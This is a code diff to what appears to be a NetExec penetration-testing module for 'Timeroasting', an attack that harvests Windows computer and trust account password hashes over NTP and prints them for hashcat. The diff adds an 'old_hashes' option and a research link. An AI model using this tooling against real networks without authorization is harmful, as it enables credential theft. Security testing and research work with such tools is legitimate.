@@ -17,6 +17,8 @@ class NXCModule:
     Module by Disgame: @Disgame
     Based on research from SecuraBV (@SecuraBV)
 
+    https://github.com/SecuraBV/Timeroast/
+
     Much of this code was copied from the original implementation.
     '''
 
@@ -24,7 +26,7 @@ class NXCModule:
     description = 'Timeroasting exploits Windows NTP authentication to request password hashes of any computer or trust account'
     supported_protocols = ['smb']
     opsec_safe = True
-    multiple_hosts = True
+    multiple_hosts = False
 
     def __init__(self):
         self.context = None
@@ -35,13 +37,11 @@ class NXCModule:
         
 
     def options(self, context, module_options):
-        """Required.
-        Module options get parsed here. Additionally, put the modules usage here as well
-        """
         self.rids = range(1, 2**31)
         self.rate = 180
         self.timeout = 24
         self.src_port = 0
+        self.old_hashes = False
         self.target = None
 
         if "rids" in module_options:
@@ -52,13 +52,14 @@ class NXCModule:
             self.timeout = module_options["timeout"]
         if "src_port" in module_options:
             self.src_port = module_options["src_port"]
+        if "old_hashes" in module_options:
+            self.old_hashes = module_options["old_hashes"]
 
     def on_login(self, context, connection):
-
         if self.target is None:
             self.target = connection.host
 
-        for rid, hash, salt in self.run_ntp_roast(context, self.target, self.rids, self.rate, self.timeout, False, self.src_port):
+        for rid, hash, salt in self.run_ntp_roast(context, self.target, self.rids, self.rate, self.timeout, self.old_hashes, self.src_port):
             context.log.highlight(hashcat_format(rid, hash, salt))
 
     def run_ntp_roast(self, context, dc_host, rids, rate, giveup_time, old_pwd, src_port = 0):
